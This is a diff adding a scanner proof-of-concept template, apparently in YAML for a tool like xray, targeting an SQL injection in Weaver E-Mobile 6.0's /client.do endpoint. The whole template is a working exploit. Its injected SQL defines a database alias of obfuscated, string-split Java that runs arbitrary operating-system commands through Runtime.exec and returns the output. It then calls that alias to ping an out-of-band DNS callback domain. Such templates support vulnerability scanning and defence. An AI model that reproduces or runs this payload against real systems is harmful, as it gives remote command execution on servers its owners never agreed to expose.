@@ -1,0 +1,41 @@
+id: poc-yaml-weaver-e-mobile-6.0-client-do-sqli
+info:
+  name: 泛微 E-Mobile 6.0 Client.do SQL注入漏洞
+  severity: critical
+  tags:
+  - DNSLOG
+  - sql-injection
+  finger: e-mobile
+  fofa: E-Mobile 6.0
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: POST
+  path: /client.do
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvVPZWWKFq310ISXS
+  data: '------WebKitFormBoundaryvVPZWWKFq310ISXS
+
+    Content-Disposition: form-data; name="method"
+
+
+    getupload
+
+    ------WebKitFormBoundaryvVPZWWKFq310ISXS
+
+    Content-Disposition: form-data; name="uploadID"
+
+
+    1'';CREATE ALIAS if not exists abcd AS CONCAT(''void e(String cmd) throws java.la'',''ng.Exception{'',''Object
+    curren'',''tRequest = Thre'',''ad.currentT'',''hread().getConte'',''xtClass'',''Loader().loadC'',''lass("com.caucho.server.dispatch.ServletInvocation").getMet'',''hod("getContextRequest").inv'',''oke(null);java.la'',''ng.reflect.Field
+    _responseF = currentRequest.getCl'',''ass().getSuperc'',''lass().getDeclar'',''edField("_response");_responseF.setAcce'',''ssible(true);Object
+    response = _responseF.get(currentRequest);java.la'',''ng.reflect.Method getWriterM
+    = response.getCl'',''ass().getMethod("getWriter");java.i'',''o.Writer writer =
+    (java.i'',''o.Writer)getWriterM.inv'',''oke(response);java.ut'',''il.Scan'',''ner
+    scan'',''ner = (new java.util.Scann'',''er(Runt'',''ime.getRunt'',''ime().ex'',''ec(cmd).getInput'',''Stream())).useDelimiter("\\A");writer.write(scan'',''ner.hasNext()?sca'',''nner.next():"");}'');CALL
+    abcd(''ping {{.reverseDomain}}'');--
+
+    ------WebKitFormBoundaryvVPZWWKFq310ISXS--'
+  expression: status_code == 200 && contains(body,"Pinging") && reverse.Verify()
+transport: http
